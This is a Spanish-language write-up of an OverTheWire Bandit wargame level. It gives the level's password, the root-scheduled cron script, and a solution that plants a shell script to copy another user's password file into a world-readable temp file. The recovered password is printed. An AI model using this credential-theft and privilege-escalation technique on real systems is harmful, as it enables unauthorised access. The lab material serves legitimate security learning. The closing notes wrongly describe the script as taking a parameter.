## Objetivo

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel

-   user -> **bandit23**
-   Password -> QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
-   host -> **bandit.labs.overthewire.org**

## Solución
```
bandit23@bandit:~$ ls -la /etc/cron.d
total 56
drwxr-xr-x   2 root root  4096 Feb 21 22:04 .
drwxr-xr-x 108 root root 12288 Feb 21 22:04 ..
-rw-r--r--   1 root root    62 Feb 21 22:02 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Feb 21 22:02 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Feb 21 22:03 cronjob_bandit22
-rw-r--r--   1 root root   122 Feb 21 22:03 cronjob_bandit23
-rw-r--r--   1 root root   120 Feb 21 22:03 cronjob_bandit24
-rw-r--r--   1 root root    62 Feb 21 22:03 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Feb 21 22:04 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/kd
mkdir: cannot create directory ‘/tmp/kd’: File exists
bandit23@bandit:~$ mkdir /tmp/bryan
bandit23@bandit:~$ cd /tmp/bryan
bandit23@bandit:/tmp/bryan$ echo "cat /etc/bandit_pass/bandit24 > /tmp/bryan/password" > bryan.sh
bandit23@bandit:/tmp/bryan$ cat bryan.sh
cat /etc/bandit_pass/bandit24 > /tmp/bryan/password
bandit23@bandit:/tmp/bryan$ chmod 777 bryan.sh
bandit23@bandit:/tmp/bryan$ touch password
bandit23@bandit:/tmp/bryan$ ls -la
total 104
drwxrwxr-x   2 bandit23 bandit23  4096 Feb 25 15:24 .
drwxrwx-wt 574 root     root     98304 Feb 25 15:24 ..
-rwxrwxrwx   1 bandit23 bandit23    52 Feb 25 15:23 bryan.sh
-rw-rw-r--   1 bandit23 bandit23     0 Feb 25 15:24 password
bandit23@bandit:/tmp/bryan$ chmod 666 password
bandit23@bandit:/tmp/bryan$ cp bryan.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/bryan$ date
Sat Feb 25 03:26:19 PM UTC 2023
bandit23@bandit:/tmp/bryan$ ls -la
total 108
drwxrwxr-x   2 bandit23 bandit23  4096 Feb 25 15:24 .
drwxrwx-wt 577 root     root     98304 Feb 25 15:27 ..
-rwxrwxrwx   1 bandit23 bandit23    52 Feb 25 15:23 bryan.sh
-rw-rw-rw-   1 bandit23 bandit23    33 Feb 25 15:27 password
bandit23@bandit:/tmp/bryan$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/bryan$
```
## Notas adicionales

#### Definiciones que entender
- Usando cat /usr/bin/cronjob bandit23.sh podemos ver que es un script que toma un parámetro. 
- En el cual esto podemos cambiar las variables (en este caso bandit23 como nombre).

#### Cuando haciamos el cat de la ruta nos mostraba lo siguiente: 
- **#!/bin**/**bash**: En el cual esta linea indica donde se encuentra el interprete de comandos en nuestro sistema.

## Referencias
- https://blog.desdelinux.net/bin-bash/